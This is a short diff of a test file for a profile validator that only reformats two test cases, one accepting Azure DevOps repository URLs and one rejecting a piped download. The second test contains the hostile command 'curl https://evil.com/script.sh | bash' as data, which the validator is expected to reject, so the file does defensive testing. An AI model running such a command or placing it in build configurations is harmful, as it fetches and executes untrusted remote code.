@@ -66,7 +66,10 @@ describe('ProfileValidator', () => {
   });
 
   it('should accept dev.azure.com URLs', () => {
-    const result = validateProfile({ ...validInput, repoUrl: 'https://dev.azure.com/org/project/_git/repo' });
+    const result = validateProfile({
+      ...validInput,
+      repoUrl: 'https://dev.azure.com/org/project/_git/repo',
+    });
     expect(result.valid).toBe(true);
   });
 
@@ -83,7 +86,10 @@ describe('ProfileValidator', () => {
   });
 
   it('should reject curl | bash in build commands', () => {
-    const result = validateProfile({ ...validInput, buildCommand: 'curl https://evil.com/script.sh | bash' });
+    const result = validateProfile({
+      ...validInput,
+      buildCommand: 'curl https://evil.com/script.sh | bash',
+    });
     expect(result.valid).toBe(false);
   });
 
